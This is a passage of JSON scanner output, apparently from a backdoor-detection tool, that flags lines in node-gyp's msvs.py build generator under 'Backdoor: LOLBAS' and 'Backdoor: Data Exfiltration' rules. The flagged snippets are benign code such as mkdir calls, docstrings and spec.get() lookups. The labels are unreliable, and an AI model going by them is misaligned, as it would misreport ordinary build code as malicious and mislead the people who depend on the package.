            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 696,
                  "startColumn": 7,
                  "endLine": 696,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    first_outputs_cyg = [_Cygwinify(i) for i in first_outputs]\n    # Write out all: target, including mkdir for each output directory.\n    mk_file.write(\"all: %s\\n\" % \" \".join(first_outputs_cyg))\n    for od in all_output_dirs:\n        if od:\n            mk_file.write('\\tmkdir -p `cygpath -u \"%s\"`\\n' % od)\n    mk_file.write(\"\\n\")\n",
                    "rendered": {
                      "text": "    first_outputs_cyg = [_Cygwinify(i) for i in first_outputs]\n    # Write out all: target, including mkdir for each output directory.\n    mk_file.write(\"all: %s\\n\" % \" \".join(first_outputs_cyg))\n    for od in all_output_dirs:\n        if od:\n            mk_file.write('\\tmkdir -p `cygpath -u \"%s\"`\\n' % od)\n    mk_file.write(\"\\n\")\n",
                      "markdown": "`    first_outputs_cyg = [_Cygwinify(i) for i in first_outputs]\n    # Write out all: target, including mkdir for each output directory.\n    mk_file.write(\"all: %s\\n\" % \" \".join(first_outputs_cyg))\n    for od in all_output_dirs:\n        if od:\n            mk_file.write('\\tmkdir -p `cygpath -u \"%s\"`\\n' % od)\n    mk_file.write(\"\\n\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 691,
                  "startColumn": 15,
                  "endLine": 691,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            first_outputs.append(next(iter(outputs)))\n            # Get the unique output directories for this rule.\n            output_dirs = [os.path.split(i)[0] for i in outputs]\n            for od in output_dirs:\n                all_output_dirs.add(od)\n    first_outputs_cyg = [_Cygwinify(i) for i in first_outputs]\n    # Write out all: target, including mkdir for each output directory.\n",
                    "rendered": {
                      "text": "            first_outputs.append(next(iter(outputs)))\n            # Get the unique output directories for this rule.\n            output_dirs = [os.path.split(i)[0] for i in outputs]\n            for od in output_dirs:\n                all_output_dirs.add(od)\n    first_outputs_cyg = [_Cygwinify(i) for i in first_outputs]\n    # Write out all: target, including mkdir for each output directory.\n",
                      "markdown": "`            first_outputs.append(next(iter(outputs)))\n            # Get the unique output directories for this rule.\n            output_dirs = [os.path.split(i)[0] for i in outputs]\n            for od in output_dirs:\n                all_output_dirs.add(od)\n    first_outputs_cyg = [_Cygwinify(i) for i in first_outputs]\n    # Write out all: target, including mkdir for each output directory.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 672,
                  "startColumn": 5,
                  "endLine": 672,
                  "endColumn": 11,
                  "snippet": {
                    "text": "  \"\"\"\n    filename = \"{}_rules{}.mk\".format(spec[\"target_name\"], options.suffix)\n    mk_file = gyp.common.WriteOnDiff(os.path.join(output_dir, filename))\n    # Find cygwin style versions of some paths.\n    mk_file.write('OutDirCygwin:=$(shell cygpath -u \"$(OutDir)\")\\n')\n    mk_file.write('IntDirCygwin:=$(shell cygpath -u \"$(IntDir)\")\\n')\n    # Gather stuff needed to emit all: target.\n",
                    "rendered": {
                      "text": "  \"\"\"\n    filename = \"{}_rules{}.mk\".format(spec[\"target_name\"], options.suffix)\n    mk_file = gyp.common.WriteOnDiff(os.path.join(output_dir, filename))\n    # Find cygwin style versions of some paths.\n    mk_file.write('OutDirCygwin:=$(shell cygpath -u \"$(OutDir)\")\\n')\n    mk_file.write('IntDirCygwin:=$(shell cygpath -u \"$(IntDir)\")\\n')\n    # Gather stuff needed to emit all: target.\n",
                      "markdown": "`  \"\"\"\n    filename = \"{}_rules{}.mk\".format(spec[\"target_name\"], options.suffix)\n    mk_file = gyp.common.WriteOnDiff(os.path.join(output_dir, filename))\n    # Find cygwin style versions of some paths.\n    mk_file.write('OutDirCygwin:=$(shell cygpath -u \"$(OutDir)\")\\n')\n    mk_file.write('IntDirCygwin:=$(shell cygpath -u \"$(IntDir)\")\\n')\n    # Gather stuff needed to emit all: target.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 564,
                  "startColumn": 26,
                  "endLine": 565,
                  "snippet": {
                    "text": "    \"\"\"Given the input file to which a rule applied, string substitute a path.\n\n  Arguments:\n    path: a path to string expand\n    input_file: the file to which the rule applied.\n  Returns:\n    The string substituted path.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    \"\"\"Given the input file to which a rule applied, string substitute a path.\n\n  Arguments:\n    path: a path to string expand\n    input_file: the file to which the rule applied.\n  Returns:\n    The string substituted path.\n  \"\"\"\n",
                      "markdown": "`    \"\"\"Given the input file to which a rule applied, string substitute a path.\n\n  Arguments:\n    path: a path to string expand\n    input_file: the file to which the rule applied.\n  Returns:\n    The string substituted path.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 447,
                  "startColumn": 35,
                  "endLine": 447,
                  "endColumn": 41,
                  "snippet": {
                    "text": "def _BuildCommandLineForRule(spec, rule, has_input_path, do_setup_env):\n    # Currently this weird argument munging is used to duplicate the way a\n    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n",
                    "rendered": {
                      "text": "def _BuildCommandLineForRule(spec, rule, has_input_path, do_setup_env):\n    # Currently this weird argument munging is used to duplicate the way a\n    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n",
                      "markdown": "`def _BuildCommandLineForRule(spec, rule, has_input_path, do_setup_env):\n    # Currently this weird argument munging is used to duplicate the way a\n    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 446,
                  "startColumn": 12,
                  "endLine": 446,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\ndef _BuildCommandLineForRule(spec, rule, has_input_path, do_setup_env):\n    # Currently this weird argument munging is used to duplicate the way a\n    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n",
                    "rendered": {
                      "text": "\ndef _BuildCommandLineForRule(spec, rule, has_input_path, do_setup_env):\n    # Currently this weird argument munging is used to duplicate the way a\n    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n",
                      "markdown": "`\ndef _BuildCommandLineForRule(spec, rule, has_input_path, do_setup_env):\n    # Currently this weird argument munging is used to duplicate the way a\n    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 414,
                  "startColumn": 17,
                  "endLine": 414,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n        command = [\"type\"] if cmd[0] == \"cat\" else [cmd[0].replace(\"/\", \"\\\\\")]\n        # Add call before command to ensure that commands can be tied together one\n        # after the other without aborting in Incredibuild, since IB makes a bat\n",
                    "rendered": {
                      "text": "        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n        command = [\"type\"] if cmd[0] == \"cat\" else [cmd[0].replace(\"/\", \"\\\\\")]\n        # Add call before command to ensure that commands can be tied together one\n        # after the other without aborting in Incredibuild, since IB makes a bat\n",
                      "markdown": "`        cmd = cmd % {\"cygwin_dir\": cygwin_dir, \"cmd\": direct_cmd}\n        return input_dir_preamble + cmd\n    else:\n        # Convert cat --> type to mimic unix.\n        command = [\"type\"] if cmd[0] == \"cat\" else [cmd[0].replace(\"/\", \"\\\\\")]\n        # Add call before command to ensure that commands can be tied together one\n        # after the other without aborting in Incredibuild, since IB makes a bat\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 376,
                  "startColumn": 9,
                  "endLine": 376,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        input_dir_preamble = \"\"\n\n    if cygwin_shell:\n        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n",
                    "rendered": {
                      "text": "        input_dir_preamble = \"\"\n\n    if cygwin_shell:\n        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n",
                      "markdown": "`        input_dir_preamble = \"\"\n\n    if cygwin_shell:\n        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 338,
                  "startColumn": 13,
                  "endLine": 338,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            if not sdk_dir:\n                continue\n            version = MSVSVersion._RegistryGetValue(key % ver, \"ProductVersion\") or \"\"\n            # Find a matching entry in sdk_dir\\include.\n            expected_sdk_dir = r\"%s\\include\" % sdk_dir\n            names = sorted(\n                (\n",
                    "rendered": {
                      "text": "            if not sdk_dir:\n                continue\n            version = MSVSVersion._RegistryGetValue(key % ver, \"ProductVersion\") or \"\"\n            # Find a matching entry in sdk_dir\\include.\n            expected_sdk_dir = r\"%s\\include\" % sdk_dir\n            names = sorted(\n                (\n",
                      "markdown": "`            if not sdk_dir:\n                continue\n            version = MSVSVersion._RegistryGetValue(key % ver, \"ProductVersion\") or \"\"\n            # Find a matching entry in sdk_dir\\include.\n            expected_sdk_dir = r\"%s\\include\" % sdk_dir\n            names = sorted(\n                (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 53,
                  "endLine": 140,
                  "endColumn": 61,
                  "snippet": {
                    "text": "def _NormalizedSource(source):\n    \"\"\"Normalize the path.\n\n  But not if that gets rid of a variable, as this may expand to something\n  larger than one directory.\n\n  Arguments:\n",
                    "rendered": {
                      "text": "def _NormalizedSource(source):\n    \"\"\"Normalize the path.\n\n  But not if that gets rid of a variable, as this may expand to something\n  larger than one directory.\n\n  Arguments:\n",
                      "markdown": "`def _NormalizedSource(source):\n    \"\"\"Normalize the path.\n\n  But not if that gets rid of a variable, as this may expand to something\n  larger than one directory.\n\n  Arguments:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3921,
                  "startColumn": 21,
                  "endLine": 3921,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            # return and continue executing.  msbuild_use_call provides a way to\n            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n",
                    "rendered": {
                      "text": "            # return and continue executing.  msbuild_use_call provides a way to\n            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n",
                      "markdown": "`            # return and continue executing.  msbuild_use_call provides a way to\n            # disable this but I have not seen any adverse effect from doing that\n            # for everything.\n            if action.get(\"msbuild_use_call\", True):\n                cmd = \"call \" + cmd\n            commands.append(cmd)\n        # Add the custom build action for one input file.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3852,
                  "startColumn": 11,
                  "endLine": 3852,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n    targets = [build_target, clean_target]\n\n    if spec.get(\"msvs_external_builder_clcompile_cmd\"):\n        clcompile_cmd = _BuildCommandLineForRuleRaw(\n            spec,\n            spec[\"msvs_external_builder_clcompile_cmd\"],\n",
                    "rendered": {
                      "text": "\n    targets = [build_target, clean_target]\n\n    if spec.get(\"msvs_external_builder_clcompile_cmd\"):\n        clcompile_cmd = _BuildCommandLineForRuleRaw(\n            spec,\n            spec[\"msvs_external_builder_clcompile_cmd\"],\n",
                      "markdown": "`\n    targets = [build_target, clean_target]\n\n    if spec.get(\"msvs_external_builder_clcompile_cmd\"):\n        clcompile_cmd = _BuildCommandLineForRuleRaw(\n            spec,\n            spec[\"msvs_external_builder_clcompile_cmd\"],\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3815,
                  "startColumn": 11,
                  "endLine": 3815,
                  "endColumn": 16,
                  "snippet": {
                    "text": "        content += import_marmasm_targets_section\n    content += _GetMSBuildExtensionTargets(targets_files_of_rules)\n\n    if spec.get(\"msvs_external_builder\"):\n        content += _GetMSBuildExternalBuilderTargets(spec)\n\n    # TODO(jeanluc) File a bug to get rid of runas.  We had in MSVS:\n",
                    "rendered": {
                      "text": "        content += import_marmasm_targets_section\n    content += _GetMSBuildExtensionTargets(targets_files_of_rules)\n\n    if spec.get(\"msvs_external_builder\"):\n        content += _GetMSBuildExternalBuilderTargets(spec)\n\n    # TODO(jeanluc) File a bug to get rid of runas.  We had in MSVS:\n",
                      "markdown": "`        content += import_marmasm_targets_section\n    content += _GetMSBuildExtensionTargets(targets_files_of_rules)\n\n    if spec.get(\"msvs_external_builder\"):\n        content += _GetMSBuildExternalBuilderTargets(spec)\n\n    # TODO(jeanluc) File a bug to get rid of runas.  We had in MSVS:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3783,
                  "startColumn": 11,
                  "endLine": 3783,
                  "endColumn": 16,
                  "snippet": {
                    "text": "    )\n    content += import_default_section\n    content += _GetMSBuildConfigurationDetails(spec, project.build_file)\n    if spec.get(\"msvs_enable_winphone\"):\n        content += _GetMSBuildLocalProperties(\"v120_wp81\")\n    else:\n        content += _GetMSBuildLocalProperties(project.msbuild_toolset)\n",
                    "rendered": {
                      "text": "    )\n    content += import_default_section\n    content += _GetMSBuildConfigurationDetails(spec, project.build_file)\n    if spec.get(\"msvs_enable_winphone\"):\n        content += _GetMSBuildLocalProperties(\"v120_wp81\")\n    else:\n        content += _GetMSBuildLocalProperties(project.msbuild_toolset)\n",
                      "markdown": "`    )\n    content += import_default_section\n    content += _GetMSBuildConfigurationDetails(spec, project.build_file)\n    if spec.get(\"msvs_enable_winphone\"):\n        content += _GetMSBuildLocalProperties(\"v120_wp81\")\n    else:\n        content += _GetMSBuildLocalProperties(project.msbuild_toolset)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3717,
                  "startColumn": 15,
                  "endLine": 3717,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    )\n\n    # Don't add actions if we are using an external builder like ninja.\n    if not spec.get(\"msvs_external_builder\"):\n        _AddActions(actions_to_add, spec, project.build_file)\n        _AddCopies(actions_to_add, spec)\n\n",
                    "rendered": {
                      "text": "    )\n\n    # Don't add actions if we are using an external builder like ninja.\n    if not spec.get(\"msvs_external_builder\"):\n        _AddActions(actions_to_add, spec, project.build_file)\n        _AddCopies(actions_to_add, spec)\n\n",
                      "markdown": "`    )\n\n    # Don't add actions if we are using an external builder like ninja.\n    if not spec.get(\"msvs_external_builder\"):\n        _AddActions(actions_to_add, spec, project.build_file)\n        _AddCopies(actions_to_add, spec)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3709,
                  "startColumn": 20,
                  "endLine": 3709,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            extension_to_rule_name,\n        )\n    else:\n        rules = spec.get(\"rules\", [])\n        _AdjustSourcesForRules(rules, sources, excluded_sources, True)\n\n    sources, excluded_sources, excluded_idl = _AdjustSourcesAndConvertToFilterHierarchy(\n",
                    "rendered": {
                      "text": "            extension_to_rule_name,\n        )\n    else:\n        rules = spec.get(\"rules\", [])\n        _AdjustSourcesForRules(rules, sources, excluded_sources, True)\n\n    sources, excluded_sources, excluded_idl = _AdjustSourcesAndConvertToFilterHierarchy(\n",
                      "markdown": "`            extension_to_rule_name,\n        )\n    else:\n        rules = spec.get(\"rules\", [])\n        _AdjustSourcesForRules(rules, sources, excluded_sources, True)\n\n    sources, excluded_sources, excluded_idl = _AdjustSourcesAndConvertToFilterHierarchy(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3695,
                  "startColumn": 15,
                  "endLine": 3695,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    platforms = _GetUniquePlatforms(spec)\n\n    # Don't generate rules if we are using an external builder like ninja.\n    if not spec.get(\"msvs_external_builder\"):\n        _GenerateRulesForMSBuild(\n            project_dir,\n            options,\n",
                    "rendered": {
                      "text": "    platforms = _GetUniquePlatforms(spec)\n\n    # Don't generate rules if we are using an external builder like ninja.\n    if not spec.get(\"msvs_external_builder\"):\n        _GenerateRulesForMSBuild(\n            project_dir,\n            options,\n",
                      "markdown": "`    platforms = _GetUniquePlatforms(spec)\n\n    # Don't generate rules if we are using an external builder like ninja.\n    if not spec.get(\"msvs_external_builder\"):\n        _GenerateRulesForMSBuild(\n            project_dir,\n            options,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3691,
                  "startColumn": 35,
                  "endLine": 3691,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    targets_files_of_rules = set()\n    rule_dependencies = set()\n    extension_to_rule_name = {}\n    list_excluded = generator_flags.get(\"msvs_list_excluded_files\", True)\n    platforms = _GetUniquePlatforms(spec)\n\n    # Don't generate rules if we are using an external builder like ninja.\n",
                    "rendered": {
                      "text": "    targets_files_of_rules = set()\n    rule_dependencies = set()\n    extension_to_rule_name = {}\n    list_excluded = generator_flags.get(\"msvs_list_excluded_files\", True)\n    platforms = _GetUniquePlatforms(spec)\n\n    # Don't generate rules if we are using an external builder like ninja.\n",
                      "markdown": "`    targets_files_of_rules = set()\n    rule_dependencies = set()\n    extension_to_rule_name = {}\n    list_excluded = generator_flags.get(\"msvs_list_excluded_files\", True)\n    platforms = _GetUniquePlatforms(spec)\n\n    # Don't generate rules if we are using an external builder like ninja.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3667,
                  "startColumn": 25,
                  "endLine": 3667,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n                # If it's disabled in any config, turn it off in the reference.\n                if config.get(\"msvs_2010_disable_uldi_when_referenced\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"false\"])\n                    break\n            group.append(project_ref)\n",
                    "rendered": {
                      "text": "                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n                # If it's disabled in any config, turn it off in the reference.\n                if config.get(\"msvs_2010_disable_uldi_when_referenced\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"false\"])\n                    break\n            group.append(project_ref)\n",
                      "markdown": "`                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n                # If it's disabled in any config, turn it off in the reference.\n                if config.get(\"msvs_2010_disable_uldi_when_referenced\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"false\"])\n                    break\n            group.append(project_ref)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 3663,
                  "startColumn": 25,
                  "endLine": 3663,
                  "endColumn": 30,
                  "snippet": {
                    "text": "                [\"ReferenceOutputAssembly\", \"false\"],\n            ]\n            for config in dependency.spec.get(\"configurations\", {}).values():\n                if config.get(\"msvs_use_library_dependency_inputs\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n                # If it's disabled in any config, turn it off in the reference.\n",
                    "rendered": {
                      "text": "                [\"ReferenceOutputAssembly\", \"false\"],\n            ]\n            for config in dependency.spec.get(\"configurations\", {}).values():\n                if config.get(\"msvs_use_library_dependency_inputs\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n                # If it's disabled in any config, turn it off in the reference.\n",
                      "markdown": "`                [\"ReferenceOutputAssembly\", \"false\"],\n            ]\n            for config in dependency.spec.get(\"configurations\", {}).values():\n                if config.get(\"msvs_use_library_dependency_inputs\", 0):\n                    project_ref.append([\"UseLibraryDependencyInputs\", \"true\"])\n                    break\n                # If it's disabled in any config, turn it off in the reference.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
